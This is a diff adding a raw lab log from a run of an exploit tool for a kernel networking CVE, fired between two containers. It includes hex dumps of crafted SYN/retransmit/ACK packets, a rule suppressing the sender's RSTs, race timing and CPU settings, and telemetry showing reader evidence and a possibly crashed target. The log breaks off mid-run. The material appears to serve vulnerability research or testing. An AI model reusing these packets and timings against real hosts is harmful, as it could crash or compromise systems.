@@ -1,0 +1,581 @@
+Artifacts: /home/labuser/lab/artifacts-hs-ebpf-1793658753
+=== [0/7] host info ===
+uname: 6.1.189
+cmdline: BOOT_IMAGE=/boot/vmlinuz-6.1.189 root=PARTUUID=d2cb1f08-69ae-48bb-9fa6-5634fe5af59d ro console=tty0 console=ttyS0,115200 earlyprintk=ttyS0,115200 consoleblank=0
+nproc: 4
+processors: 4
+exp-version: cve2026-98432-exp 0.3.0
+kasan-syms: 89
+--- rps (empty = no RPS steering, packet stays on the CPU that sent it)
+docker0 rps_cpus=0
+--- sysctls
+net.ipv4.conf.all.accept_source_route=
+net.ipv4.conf.default.accept_source_route=
+net.ipv4.ip_forward=
+net.core.netdev_max_backlog=
+=== [1/7] containers ===
+538f702dc67203f4315aa88f15655299f418372af5ed2263617ae3d6b147ef2e
+06af54b6be87c63d55d18b7807d58e9d1fbeabdf2013db2d0e368f0a1ce38db6
+listener=172.17.0.2 sender=172.17.0.3
+grep: invalid max count
+listener: up (on 9000): 
+netns sysctls: listener syncookies=0/max_syn_backlog=4096 | sender syncookies=0/max_syn_backlog=4096
+=== [1b/7] auto-RST filter (sender netns egress) ===
+auto-RST filter: added
+sender OUTPUT chain (drop RST[!ACK] to :9000):
+    Chain OUTPUT (policy ACCEPT)
+    target     prot opt source               destination         
+    DROP       6    --  0.0.0.0/0            0.0.0.0/0            tcp dpt:9000 flags:0x14/0x04
+=== [2/7] pcap on docker0 (host side) ===
+tcpdump: listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+=== [3/7] sanity ===
+cve2026-98432-exp 0.3.0
+SYN (first, with IP options, demo port/seq/ID):
+48 00 00 40 12 34 40 00 40 06 84 4f ac 11 00 03
+ac 11 00 02 44 0c 05 01 00 00 00 00 00 00 00 00
+27 10 23 28 01 02 03 04 00 00 00 00 80 02 ff ff
+c2 b1 00 00 02 04 05 b4 04 02 03 03 07 01 01 01
+
+SYN (retransmit, byte-identical to first; sent from the CPU_rtx thread):
+48 00 00 40 12 34 40 00 40 06 84 4f ac 11 00 03
+ac 11 00 02 44 0c 05 01 00 00 00 00 00 00 00 00
+27 10 23 28 01 02 03 04 00 00 00 00 80 02 ff ff
+c2 b1 00 00 02 04 05 b4 04 02 03 03 07 01 01 01
+
+ACK (completing; ack = server-ISN+1, ISN shown as demo 0x99887766):
+45 00 00 28 12 34 40 00 40 06 d0 74 ac 11 00 03
+ac 11 00 02 27 10 23 28 01 02 03 04 99 88 77 67
+=== [3b/7] dmesg baseline (attribution: only NEW lines count) ===
+=== [4/7] FIRE handshake (90s, cpus=1,2,3) ===
+start: 2026-11-02 22:32:47 UTC
+[headless] target=172.17.0.2:9000 mode=handshake cpus rtx=1 ack=2 delta=70us rst-gap=0us timeout=5ms duration=90s
+t+0s [info] firing: mode=handshake src=172.17.0.3 dst=172.17.0.2:9000 cpus rtx=1 ack=2 delta-sweep=[70 80 90 100 110 120] timeout=5ms
+t+0s [info] handshake: coordinator pinned to a free vCPU
+t+33ms [info] handshake: READER EVIDENCE (2nd SYN-ACK, ipopt=12B) round=6 delta=70us count=1
+t+254ms syn=38 rtx=30 rounds=10 skipped=27 reader=2 synack=10 rst=4 err=0
+t+504ms syn=72 rtx=30 rounds=10 skipped=61 reader=2 synack=10 rst=4 err=0
+t+722ms [info] handshake: rounds=10 skipped=90 reader-evidence=2 synack=10
+t+754ms syn=104 rtx=30 rounds=10 skipped=93 reader=2 synack=10 rst=4 err=0
+t+1.004s syn=136 rtx=30 rounds=10 skipped=125 reader=2 synack=10 rst=4 err=0
+t+1.254s syn=169 rtx=30 rounds=10 skipped=158 reader=2 synack=10 rst=4 err=0
+t+1.475s [info] handshake: rounds=10 skipped=190 reader-evidence=2 synack=10
+t+1.504s syn=204 rtx=30 rounds=10 skipped=193 reader=2 synack=10 rst=4 err=0
+t+1.754s syn=237 rtx=30 rounds=10 skipped=226 reader=2 synack=10 rst=4 err=0
+t+2.003s syn=270 rtx=30 rounds=10 skipped=259 reader=2 synack=10 rst=4 err=0
+t+2.223s [info] handshake: rounds=10 skipped=290 reader-evidence=2 synack=10
+t+2.254s syn=304 rtx=30 rounds=10 skipped=293 reader=2 synack=10 rst=4 err=0
+t+2.504s syn=336 rtx=30 rounds=10 skipped=325 reader=2 synack=10 rst=4 err=0
+t+2.754s syn=369 rtx=30 rounds=10 skipped=358 reader=2 synack=10 rst=4 err=0
+t+2.974s [info] handshake: rounds=10 skipped=390 reader-evidence=2 synack=10
+t+3.004s [alert] no SYN-ACK/RST for 2s after 435 packets - target may be down (check dmesg/KASAN on target)
+t+3.004s syn=405 rtx=30 rounds=10 skipped=394 reader=2 synack=10 rst=4 err=0
+t+3.254s syn=439 rtx=30 rounds=10 skipped=428 reader=2 synack=10 rst=4 err=0
+t+3.504s syn=472 rtx=30 rounds=10 skipped=461 reader=2 synack=10 rst=4 err=0
+t+3.722s [info] handshake: rounds=10 skipped=490 reader-evidence=2 synack=10
+t+3.754s syn=505 rtx=30 rounds=10 skipped=494 reader=2 synack=10 rst=4 err=0
+t+4.003s syn=539 rtx=30 rounds=10 skipped=528 reader=2 synack=10 rst=4 err=0
+t+4.254s syn=574 rtx=30 rounds=10 skipped=563 reader=2 synack=10 rst=4 err=0
+t+4.446s [info] handshake: rounds=10 skipped=590 reader-evidence=2 synack=10
+t+4.504s syn=608 rtx=30 rounds=10 skipped=597 reader=2 synack=10 rst=4 err=0
+t+4.754s syn=642 rtx=30 rounds=10 skipped=631 reader=2 synack=10 rst=4 err=0
+t+5.004s syn=675 rtx=30 rounds=10 skipped=664 reader=2 synack=10 rst=4 err=0
+t+5.193s [info] handshake: rounds=10 skipped=690 reader-evidence=2 synack=10
+t+5.254s syn=708 rtx=30 rounds=10 skipped=697 reader=2 synack=10 rst=4 err=0
+t+5.504s syn=742 rtx=30 rounds=10 skipped=731 reader=2 synack=10 rst=4 err=0
+t+5.754s syn=776 rtx=30 rounds=10 skipped=765 reader=2 synack=10 rst=4 err=0
+t+5.93s [info] handshake: rounds=10 skipped=790 reader-evidence=2 synack=10
+t+6.003s syn=810 rtx=30 rounds=10 skipped=799 reader=2 synack=10 rst=4 err=0
+t+6.254s syn=845 rtx=30 rounds=10 skipped=834 reader=2 synack=10 rst=4 err=0
+t+6.504s syn=880 rtx=30 rounds=10 skipped=869 reader=2 synack=10 rst=4 err=0
+t+6.656s [info] handshake: rounds=10 skipped=890 reader-evidence=2 synack=10
+t+6.754s syn=914 rtx=30 rounds=10 skipped=903 reader=2 synack=10 rst=4 err=0
+t+7.003s syn=948 rtx=30 rounds=10 skipped=937 reader=2 synack=10 rst=4 err=0
+t+7.253s syn=983 rtx=30 rounds=10 skipped=972 reader=2 synack=10 rst=4 err=0
+t+7.388s [info] handshake: rounds=10 skipped=990 reader-evidence=2 synack=10
+t+7.504s syn=1017 rtx=30 rounds=10 skipped=1006 reader=2 synack=10 rst=4 err=0
+t+7.754s syn=1051 rtx=30 rounds=10 skipped=1040 reader=2 synack=10 rst=4 err=0
+t+8.004s syn=1086 rtx=30 rounds=10 skipped=1075 reader=2 synack=10 rst=4 err=0
+t+8.108s [info] handshake: rounds=10 skipped=1090 reader-evidence=2 synack=10
+t+8.254s syn=1121 rtx=30 rounds=10 skipped=1110 reader=2 synack=10 rst=4 err=0
+t+8.504s syn=1153 rtx=30 rounds=10 skipped=1142 reader=2 synack=10 rst=4 err=0
+t+8.753s syn=1185 rtx=30 rounds=10 skipped=1175 reader=2 synack=10 rst=4 err=0
+t+8.875s [info] handshake: rounds=10 skipped=1190 reader-evidence=2 synack=10
+t+9.004s syn=1218 rtx=30 rounds=10 skipped=1207 reader=2 synack=10 rst=4 err=0
+t+9.254s syn=1253 rtx=30 rounds=10 skipped=1242 reader=2 synack=10 rst=4 err=0
+t+9.504s syn=1287 rtx=30 rounds=10 skipped=1276 reader=2 synack=10 rst=4 err=0
+t+9.608s [info] handshake: rounds=10 skipped=1290 reader-evidence=2 synack=10
+t+9.754s syn=1320 rtx=30 rounds=10 skipped=1309 reader=2 synack=10 rst=4 err=0
+t+10.004s syn=1354 rtx=30 rounds=10 skipped=1343 reader=2 synack=10 rst=4 err=0
+t+10.254s syn=1388 rtx=30 rounds=10 skipped=1377 reader=2 synack=10 rst=4 err=0
+t+10.351s [info] handshake: rounds=10 skipped=1390 reader-evidence=2 synack=10
+t+10.504s syn=1421 rtx=30 rounds=10 skipped=1410 reader=2 synack=10 rst=4 err=0
+t+10.754s syn=1455 rtx=30 rounds=10 skipped=1444 reader=2 synack=10 rst=4 err=0
+t+11.003s syn=1490 rtx=30 rounds=10 skipped=1479 reader=2 synack=10 rst=4 err=0
+t+11.08s [info] handshake: rounds=10 skipped=1490 reader-evidence=2 synack=10
+t+11.254s syn=1524 rtx=30 rounds=10 skipped=1513 reader=2 synack=10 rst=4 err=0
+t+11.503s syn=1557 rtx=30 rounds=10 skipped=1546 reader=2 synack=10 rst=4 err=0
+t+11.753s syn=1590 rtx=30 rounds=10 skipped=1579 reader=2 synack=10 rst=4 err=0
+t+11.833s [info] handshake: rounds=10 skipped=1590 reader-evidence=2 synack=10
+t+12.004s syn=1625 rtx=30 rounds=10 skipped=1614 reader=2 synack=10 rst=4 err=0
+t+12.254s syn=1659 rtx=30 rounds=10 skipped=1648 reader=2 synack=10 rst=4 err=0
+t+12.504s syn=1693 rtx=30 rounds=10 skipped=1682 reader=2 synack=10 rst=4 err=0
+t+12.56s [info] handshake: rounds=10 skipped=1690 reader-evidence=2 synack=10
+t+12.754s syn=1727 rtx=30 rounds=10 skipped=1716 reader=2 synack=10 rst=4 err=0
+t+13.004s syn=1760 rtx=30 rounds=10 skipped=1750 reader=2 synack=10 rst=4 err=0
+t+13.254s syn=1795 rtx=30 rounds=10 skipped=1784 reader=2 synack=10 rst=4 err=0
+t+13.299s [info] handshake: rounds=10 skipped=1790 reader-evidence=2 synack=10
+t+13.504s syn=1828 rtx=30 rounds=10 skipped=1817 reader=2 synack=10 rst=4 err=0
+t+13.754s syn=1863 rtx=30 rounds=10 skipped=1852 reader=2 synack=10 rst=4 err=0
+t+14.003s syn=1896 rtx=30 rounds=10 skipped=1885 reader=2 synack=10 rst=4 err=0
+t+14.04s [info] handshake: rounds=10 skipped=1890 reader-evidence=2 synack=10
+t+14.253s syn=1929 rtx=30 rounds=10 skipped=1918 reader=2 synack=10 rst=4 err=0
+t+14.504s syn=1963 rtx=30 rounds=10 skipped=1952 reader=2 synack=10 rst=4 err=0
+t+14.754s syn=1996 rtx=30 rounds=10 skipped=1985 reader=2 synack=10 rst=4 err=0
+t+14.781s [info] handshake: rounds=10 skipped=1990 reader-evidence=2 synack=10
+t+15.004s syn=2030 rtx=30 rounds=10 skipped=2019 reader=2 synack=10 rst=4 err=0
+t+15.254s syn=2063 rtx=30 rounds=10 skipped=2052 reader=2 synack=10 rst=4 err=0
+t+15.504s syn=2097 rtx=30 rounds=10 skipped=2086 reader=2 synack=10 rst=4 err=0
+t+15.526s [info] handshake: rounds=10 skipped=2090 reader-evidence=2 synack=10
+t+15.754s syn=2131 rtx=30 rounds=10 skipped=2120 reader=2 synack=10 rst=4 err=0
+t+16.004s syn=2165 rtx=30 rounds=10 skipped=2154 reader=2 synack=10 rst=4 err=0
+t+16.253s syn=2199 rtx=30 rounds=10 skipped=2188 reader=2 synack=10 rst=4 err=0
+t+16.261s [info] handshake: rounds=10 skipped=2190 reader-evidence=2 synack=10
+t+16.504s syn=2233 rtx=30 rounds=10 skipped=2222 reader=2 synack=10 rst=4 err=0
+t+16.753s syn=2267 rtx=30 rounds=10 skipped=2256 reader=2 synack=10 rst=4 err=0
+t+17.004s syn=2300 rtx=30 rounds=10 skipped=2289 reader=2 synack=10 rst=4 err=0
+t+17.004s [info] handshake: rounds=10 skipped=2290 reader-evidence=2 synack=10
+t+17.253s syn=2335 rtx=30 rounds=10 skipped=2324 reader=2 synack=10 rst=4 err=0
+t+17.504s syn=2368 rtx=30 rounds=10 skipped=2357 reader=2 synack=10 rst=4 err=0
+t+17.749s [info] handshake: rounds=10 skipped=2390 reader-evidence=2 synack=10
+t+17.754s syn=2401 rtx=30 rounds=10 skipped=2390 reader=2 synack=10 rst=4 err=0
+t+18.004s syn=2434 rtx=30 rounds=10 skipped=2423 reader=2 synack=10 rst=4 err=0
+t+18.254s syn=2467 rtx=30 rounds=10 skipped=2456 reader=2 synack=10 rst=4 err=0
+t+18.49s [info] handshake: rounds=10 skipped=2490 reader-evidence=2 synack=10
+t+18.504s syn=2502 rtx=30 rounds=10 skipped=2491 reader=2 synack=10 rst=4 err=0
+t+18.753s syn=2536 rtx=30 rounds=10 skipped=2525 reader=2 synack=10 rst=4 err=0
+t+19.004s syn=2570 rtx=30 rounds=10 skipped=2559 reader=2 synack=10 rst=4 err=0
+t+19.234s [info] handshake: rounds=10 skipped=2590 reader-evidence=2 synack=10
+t+19.254s syn=2603 rtx=30 rounds=10 skipped=2592 reader=2 synack=10 rst=4 err=0
+t+19.504s syn=2637 rtx=30 rounds=10 skipped=2626 reader=2 synack=10 rst=4 err=0
+t+19.754s syn=2670 rtx=30 rounds=10 skipped=2659 reader=2 synack=10 rst=4 err=0
+t+19.969s [info] handshake: rounds=10 skipped=2690 reader-evidence=2 synack=10
+t+20.004s syn=2705 rtx=30 rounds=10 skipped=2694 reader=2 synack=10 rst=4 err=0
+t+20.254s syn=2739 rtx=30 rounds=10 skipped=2728 reader=2 synack=10 rst=4 err=0
+t+20.503s syn=2774 rtx=30 rounds=10 skipped=2763 reader=2 synack=10 rst=4 err=0
+t+20.698s [info] handshake: rounds=10 skipped=2790 reader-evidence=2 synack=10
+t+20.754s syn=2808 rtx=30 rounds=10 skipped=2797 reader=2 synack=10 rst=4 err=0
+t+21.004s syn=2841 rtx=30 rounds=10 skipped=2830 reader=2 synack=10 rst=4 err=0
+t+21.254s syn=2876 rtx=30 rounds=10 skipped=2865 reader=2 synack=10 rst=4 err=0
+t+21.435s [info] handshake: rounds=10 skipped=2890 reader-evidence=2 synack=10
+t+21.504s syn=2910 rtx=30 rounds=10 skipped=2899 reader=2 synack=10 rst=4 err=0
+t+21.754s syn=2945 rtx=30 rounds=10 skipped=2934 reader=2 synack=10 rst=4 err=0
+t+22.004s syn=2980 rtx=30 rounds=10 skipped=2969 reader=2 synack=10 rst=4 err=0
+t+22.156s [info] handshake: rounds=10 skipped=2990 reader-evidence=2 synack=10
+t+22.254s syn=3013 rtx=30 rounds=10 skipped=3002 reader=2 synack=10 rst=4 err=0
+t+22.503s syn=3047 rtx=30 rounds=10 skipped=3036 reader=2 synack=10 rst=4 err=0
+t+22.754s syn=3081 rtx=30 rounds=10 skipped=3070 reader=2 synack=10 rst=4 err=0
+t+22.906s [info] handshake: rounds=10 skipped=3090 reader-evidence=2 synack=10
+t+23.004s syn=3114 rtx=30 rounds=10 skipped=3103 reader=2 synack=10 rst=4 err=0
+t+23.254s syn=3148 rtx=30 rounds=10 skipped=3137 reader=2 synack=10 rst=4 err=0
+t+23.504s syn=3182 rtx=30 rounds=10 skipped=3171 reader=2 synack=10 rst=4 err=0
+t+23.642s [info] handshake: rounds=10 skipped=3190 reader-evidence=2 synack=10
+t+23.754s syn=3215 rtx=30 rounds=10 skipped=3204 reader=2 synack=10 rst=4 err=0
+t+24.004s syn=3249 rtx=30 rounds=10 skipped=3238 reader=2 synack=10 rst=4 err=0
+t+24.254s syn=3284 rtx=30 rounds=10 skipped=3273 reader=2 synack=10 rst=4 err=0
+t+24.375s [info] handshake: rounds=10 skipped=3290 reader-evidence=2 synack=10
+t+24.503s syn=3319 rtx=30 rounds=10 skipped=3308 reader=2 synack=10 rst=4 err=0
+t+24.754s syn=3354 rtx=30 rounds=10 skipped=3343 reader=2 synack=10 rst=4 err=0
+t+25.003s syn=3387 rtx=30 rounds=10 skipped=3376 reader=2 synack=10 rst=4 err=0
+t+25.104s [info] handshake: rounds=10 skipped=3390 reader-evidence=2 synack=10
+t+25.254s syn=3421 rtx=30 rounds=10 skipped=3410 reader=2 synack=10 rst=4 err=0
+t+25.504s syn=3455 rtx=30 rounds=10 skipped=3444 reader=2 synack=10 rst=4 err=0
+t+25.754s syn=3488 rtx=30 rounds=10 skipped=3477 reader=2 synack=10 rst=4 err=0
+t+25.847s [info] handshake: rounds=10 skipped=3490 reader-evidence=2 synack=10
+t+26.004s syn=3521 rtx=30 rounds=10 skipped=3510 reader=2 synack=10 rst=4 err=0
+t+26.254s syn=3555 rtx=30 rounds=10 skipped=3545 reader=2 synack=10 rst=4 err=0
+t+26.504s syn=3589 rtx=30 rounds=10 skipped=3578 reader=2 synack=10 rst=4 err=0
+t+26.587s [info] handshake: rounds=10 skipped=3590 reader-evidence=2 synack=10
+t+26.754s syn=3624 rtx=30 rounds=10 skipped=3613 reader=2 synack=10 rst=4 err=0
+t+27.004s syn=3658 rtx=30 rounds=10 skipped=3647 reader=2 synack=10 rst=4 err=0
+t+27.253s syn=3692 rtx=30 rounds=10 skipped=3681 reader=2 synack=10 rst=4 err=0
+t+27.318s [info] handshake: rounds=10 skipped=3690 reader-evidence=2 synack=10
+t+27.504s syn=3725 rtx=30 rounds=10 skipped=3714 reader=2 synack=10 rst=4 err=0
+t+27.753s syn=3758 rtx=30 rounds=10 skipped=3747 reader=2 synack=10 rst=4 err=0
+t+28.004s syn=3791 rtx=30 rounds=10 skipped=3780 reader=2 synack=10 rst=4 err=0
+t+28.07s [info] handshake: rounds=10 skipped=3790 reader-evidence=2 synack=10
+t+28.254s syn=3825 rtx=30 rounds=10 skipped=3814 reader=2 synack=10 rst=4 err=0
+t+28.504s syn=3858 rtx=30 rounds=10 skipped=3847 reader=2 synack=10 rst=4 err=0
+t+28.754s syn=3891 rtx=30 rounds=10 skipped=3880 reader=2 synack=10 rst=4 err=0
+t+28.819s [info] handshake: rounds=10 skipped=3890 reader-evidence=2 synack=10
+t+29.004s syn=3927 rtx=30 rounds=10 skipped=3916 reader=2 synack=10 rst=4 err=0
+t+29.254s syn=3960 rtx=30 rounds=10 skipped=3949 reader=2 synack=10 rst=4 err=0
+t+29.504s syn=3994 rtx=30 rounds=10 skipped=3983 reader=2 synack=10 rst=4 err=0
+t+29.555s [info] handshake: rounds=10 skipped=3990 reader-evidence=2 synack=10
+t+29.754s syn=4027 rtx=30 rounds=10 skipped=4016 reader=2 synack=10 rst=4 err=0
+t+30.004s syn=4060 rtx=30 rounds=10 skipped=4049 reader=2 synack=10 rst=4 err=0
+t+30.254s syn=4093 rtx=30 rounds=10 skipped=4082 reader=2 synack=10 rst=4 err=0
+t+30.311s [info] handshake: rounds=10 skipped=4090 reader-evidence=2 synack=10
+t+30.504s syn=4127 rtx=30 rounds=10 skipped=4116 reader=2 synack=10 rst=4 err=0
+t+30.754s syn=4160 rtx=30 rounds=10 skipped=4149 reader=2 synack=10 rst=4 err=0
+t+31.004s syn=4193 rtx=30 rounds=10 skipped=4182 reader=2 synack=10 rst=4 err=0
+t+31.06s [info] handshake: rounds=10 skipped=4190 reader-evidence=2 synack=10
+t+31.254s syn=4226 rtx=30 rounds=10 skipped=4215 reader=2 synack=10 rst=4 err=0
+t+31.504s syn=4259 rtx=30 rounds=10 skipped=4248 reader=2 synack=10 rst=4 err=0
+t+31.754s syn=4293 rtx=30 rounds=10 skipped=4282 reader=2 synack=10 rst=4 err=0
+t+31.806s [info] handshake: rounds=10 skipped=4290 reader-evidence=2 synack=10
+t+32.004s syn=4330 rtx=30 rounds=10 skipped=4319 reader=2 synack=10 rst=4 err=0
+t+32.254s syn=4364 rtx=30 rounds=10 skipped=4353 reader=2 synack=10 rst=4 err=0
+t+32.504s syn=4399 rtx=30 rounds=10 skipped=4388 reader=2 synack=10 rst=4 err=0
+t+32.516s [info] handshake: rounds=10 skipped=4390 reader-evidence=2 synack=10
+t+32.754s syn=4433 rtx=30 rounds=10 skipped=4422 reader=2 synack=10 rst=4 err=0
+t+33.004s syn=4467 rtx=30 rounds=10 skipped=4456 reader=2 synack=10 rst=4 err=0
+t+33.233s [info] handshake: rounds=10 skipped=4490 reader-evidence=2 synack=10
+t+33.254s syn=4503 rtx=30 rounds=10 skipped=4492 reader=2 synack=10 rst=4 err=0
+t+33.504s syn=4538 rtx=30 rounds=10 skipped=4527 reader=2 synack=10 rst=4 err=0
+t+33.754s syn=4571 rtx=30 rounds=10 skipped=4560 reader=2 synack=10 rst=4 err=0
+t+33.968s [info] handshake: rounds=10 skipped=4590 reader-evidence=2 synack=10
+t+34.004s syn=4606 rtx=30 rounds=10 skipped=4595 reader=2 synack=10 rst=4 err=0
+t+34.254s syn=4641 rtx=30 rounds=10 skipped=4630 reader=2 synack=10 rst=4 err=0
+t+34.504s syn=4674 rtx=30 rounds=10 skipped=4663 reader=2 synack=10 rst=4 err=0
+t+34.696s [info] handshake: rounds=10 skipped=4690 reader-evidence=2 synack=10
+t+34.754s syn=4708 rtx=30 rounds=10 skipped=4697 reader=2 synack=10 rst=4 err=0
+t+35.004s syn=4741 rtx=30 rounds=10 skipped=4730 reader=2 synack=10 rst=4 err=0
+t+35.253s syn=4774 rtx=30 rounds=10 skipped=4763 reader=2 synack=10 rst=4 err=0
+t+35.449s [info] handshake: rounds=10 skipped=4790 reader-evidence=2 synack=10
+t+35.504s syn=4808 rtx=30 rounds=10 skipped=4797 reader=2 synack=10 rst=4 err=0
+t+35.753s syn=4842 rtx=30 rounds=10 skipped=4831 reader=2 synack=10 rst=4 err=0
+t+36.003s syn=4875 rtx=30 rounds=10 skipped=4864 reader=2 synack=10 rst=4 err=0
+t+36.194s [info] handshake: rounds=10 skipped=4890 reader-evidence=2 synack=10
+t+36.254s syn=4908 rtx=30 rounds=10 skipped=4897 reader=2 synack=10 rst=4 err=0
+t+36.504s syn=4943 rtx=30 rounds=10 skipped=4932 reader=2 synack=10 rst=4 err=0
+t+36.754s syn=4976 rtx=30 rounds=10 skipped=4965 reader=2 synack=10 rst=4 err=0
+t+36.939s [info] handshake: rounds=10 skipped=4990 reader-evidence=2 synack=10
+t+37.004s syn=5009 rtx=30 rounds=10 skipped=4998 reader=2 synack=10 rst=4 err=0
+t+37.254s syn=5043 rtx=30 rounds=10 skipped=5032 reader=2 synack=10 rst=4 err=0
+t+37.504s syn=5077 rtx=30 rounds=10 skipped=5066 reader=2 synack=10 rst=4 err=0
+t+37.677s [info] handshake: rounds=10 skipped=5090 reader-evidence=2 synack=10
+t+37.754s syn=5111 rtx=30 rounds=10 skipped=5100 reader=2 synack=10 rst=4 err=0
+t+38.003s syn=5144 rtx=30 rounds=10 skipped=5133 reader=2 synack=10 rst=4 err=0
+t+38.254s syn=5178 rtx=30 rounds=10 skipped=5167 reader=2 synack=10 rst=4 err=0
+t+38.418s [info] handshake: rounds=10 skipped=5190 reader-evidence=2 synack=10
+t+38.503s syn=5212 rtx=30 rounds=10 skipped=5201 reader=2 synack=10 rst=4 err=0
+t+38.754s syn=5245 rtx=30 rounds=10 skipped=5234 reader=2 synack=10 rst=4 err=0
+t+39.004s syn=5279 rtx=30 rounds=10 skipped=5268 reader=2 synack=10 rst=4 err=0
+t+39.171s [info] handshake: rounds=10 skipped=5290 reader-evidence=2 synack=10
+t+39.254s syn=5311 rtx=30 rounds=10 skipped=5300 reader=2 synack=10 rst=4 err=0
+t+39.504s syn=5346 rtx=30 rounds=10 skipped=5335 reader=2 synack=10 rst=4 err=0
+t+39.754s syn=5379 rtx=30 rounds=10 skipped=5368 reader=2 synack=10 rst=4 err=0
+t+39.909s [info] handshake: rounds=10 skipped=5390 reader-evidence=2 synack=10
+t+40.004s syn=5413 rtx=30 rounds=10 skipped=5402 reader=2 synack=10 rst=4 err=0
+t+40.254s syn=5447 rtx=30 rounds=10 skipped=5436 reader=2 synack=10 rst=4 err=0
+t+40.504s syn=5480 rtx=30 rounds=10 skipped=5469 reader=2 synack=10 rst=4 err=0
+t+40.665s [info] handshake: rounds=10 skipped=5490 reader-evidence=2 synack=10
+t+40.754s syn=5512 rtx=30 rounds=10 skipped=5501 reader=2 synack=10 rst=4 err=0
+t+41.004s syn=5545 rtx=30 rounds=10 skipped=5535 reader=2 synack=10 rst=4 err=0
+t+41.254s syn=5579 rtx=30 rounds=10 skipped=5568 reader=2 synack=10 rst=4 err=0
+t+41.415s [info] handshake: rounds=10 skipped=5590 reader-evidence=2 synack=10
+t+41.504s syn=5613 rtx=30 rounds=10 skipped=5602 reader=2 synack=10 rst=4 err=0
+t+41.754s syn=5646 rtx=30 rounds=10 skipped=5635 reader=2 synack=10 rst=4 err=0
+t+42.004s syn=5680 rtx=30 rounds=10 skipped=5669 reader=2 synack=10 rst=4 err=0
+t+42.156s [info] handshake: rounds=10 skipped=5690 reader-evidence=2 synack=10
+t+42.253s syn=5714 rtx=30 rounds=10 skipped=5703 reader=2 synack=10 rst=4 err=0
+t+42.504s syn=5749 rtx=30 rounds=10 skipped=5738 reader=2 synack=10 rst=4 err=0
+t+42.753s syn=5783 rtx=30 rounds=10 skipped=5772 reader=2 synack=10 rst=4 err=0
+t+42.881s [info] handshake: rounds=10 skipped=5790 reader-evidence=2 synack=10
+t+43.004s syn=5817 rtx=30 rounds=10 skipped=5806 reader=2 synack=10 rst=4 err=0
+t+43.253s syn=5851 rtx=30 rounds=10 skipped=5840 reader=2 synack=10 rst=4 err=0
+t+43.504s syn=5884 rtx=30 rounds=10 skipped=5873 reader=2 synack=10 rst=4 err=0
+t+43.668s [info] handshake: rounds=10 skipped=5890 reader-evidence=2 synack=10
+t+43.754s syn=5912 rtx=30 rounds=10 skipped=5901 reader=2 synack=10 rst=4 err=0
+t+44.003s syn=5947 rtx=30 rounds=10 skipped=5936 reader=2 synack=10 rst=4 err=0
+t+44.254s syn=5981 rtx=30 rounds=10 skipped=5970 reader=2 synack=10 rst=4 err=0
+t+44.398s [info] handshake: rounds=10 skipped=5990 reader-evidence=2 synack=10
+t+44.504s syn=6015 rtx=30 rounds=10 skipped=6004 reader=2 synack=10 rst=4 err=0
+t+44.754s syn=6048 rtx=30 rounds=10 skipped=6037 reader=2 synack=10 rst=4 err=0
+t+45.004s syn=6083 rtx=30 rounds=10 skipped=6072 reader=2 synack=10 rst=4 err=0
+t+45.128s [info] handshake: rounds=10 skipped=6090 reader-evidence=2 synack=10
+t+45.254s syn=6119 rtx=30 rounds=10 skipped=6108 reader=2 synack=10 rst=4 err=0
+t+45.503s syn=6153 rtx=30 rounds=10 skipped=6142 reader=2 synack=10 rst=4 err=0
+t+45.754s syn=6187 rtx=30 rounds=10 skipped=6176 reader=2 synack=10 rst=4 err=0
+t+45.852s [info] handshake: rounds=10 skipped=6190 reader-evidence=2 synack=10
+t+46.004s syn=6221 rtx=30 rounds=10 skipped=6210 reader=2 synack=10 rst=4 err=0
+t+46.254s syn=6255 rtx=30 rounds=10 skipped=6244 reader=2 synack=10 rst=4 err=0
+t+46.504s syn=6288 rtx=30 rounds=10 skipped=6277 reader=2 synack=10 rst=4 err=0
+t+46.595s [info] handshake: rounds=10 skipped=6290 reader-evidence=2 synack=10
+t+46.754s syn=6322 rtx=30 rounds=10 skipped=6311 reader=2 synack=10 rst=4 err=0
+t+47.004s syn=6355 rtx=30 rounds=10 skipped=6344 reader=2 synack=10 rst=4 err=0
+t+47.254s syn=6389 rtx=30 rounds=10 skipped=6378 reader=2 synack=10 rst=4 err=0
+t+47.338s [info] handshake: rounds=10 skipped=6390 reader-evidence=2 synack=10
+t+47.504s syn=6423 rtx=30 rounds=10 skipped=6412 reader=2 synack=10 rst=4 err=0
+t+47.753s syn=6455 rtx=30 rounds=10 skipped=6444 reader=2 synack=10 rst=4 err=0
+t+48.004s syn=6488 rtx=30 rounds=10 skipped=6477 reader=2 synack=10 rst=4 err=0
+t+48.092s [info] handshake: rounds=10 skipped=6490 reader-evidence=2 synack=10
+t+48.253s syn=6523 rtx=30 rounds=10 skipped=6512 reader=2 synack=10 rst=4 err=0
+t+48.504s syn=6557 rtx=30 rounds=10 skipped=6546 reader=2 synack=10 rst=4 err=0
+t+48.754s syn=6591 rtx=30 rounds=10 skipped=6580 reader=2 synack=10 rst=4 err=0
+t+48.822s [info] handshake: rounds=10 skipped=6590 reader-evidence=2 synack=10
+t+49.004s syn=6625 rtx=30 rounds=10 skipped=6614 reader=2 synack=10 rst=4 err=0
+t+49.254s syn=6658 rtx=30 rounds=10 skipped=6647 reader=2 synack=10 rst=4 err=0
+t+49.504s syn=6693 rtx=30 rounds=10 skipped=6682 reader=2 synack=10 rst=4 err=0
+t+49.562s [info] handshake: rounds=10 skipped=6690 reader-evidence=2 synack=10
+t+49.754s syn=6727 rtx=30 rounds=10 skipped=6716 reader=2 synack=10 rst=4 err=0
+t+50.004s syn=6760 rtx=30 rounds=10 skipped=6749 reader=2 synack=10 rst=4 err=0
+t+50.254s syn=6794 rtx=30 rounds=10 skipped=6783 reader=2 synack=10 rst=4 err=0
+t+50.301s [info] handshake: rounds=10 skipped=6790 reader-evidence=2 synack=10
+t+50.504s syn=6828 rtx=30 rounds=10 skipped=6817 reader=2 synack=10 rst=4 err=0
+t+50.754s syn=6861 rtx=30 rounds=10 skipped=6850 reader=2 synack=10 rst=4 err=0
+t+51.004s syn=6894 rtx=30 rounds=10 skipped=6883 reader=2 synack=10 rst=4 err=0
+t+51.048s [info] handshake: rounds=10 skipped=6890 reader-evidence=2 synack=10
+t+51.254s syn=6928 rtx=30 rounds=10 skipped=6918 reader=2 synack=10 rst=4 err=0
+t+51.504s syn=6961 rtx=30 rounds=10 skipped=6950 reader=2 synack=10 rst=4 err=0
+t+51.754s syn=6995 rtx=30 rounds=10 skipped=6984 reader=2 synack=10 rst=4 err=0
+t+51.793s [info] handshake: rounds=10 skipped=6990 reader-evidence=2 synack=10
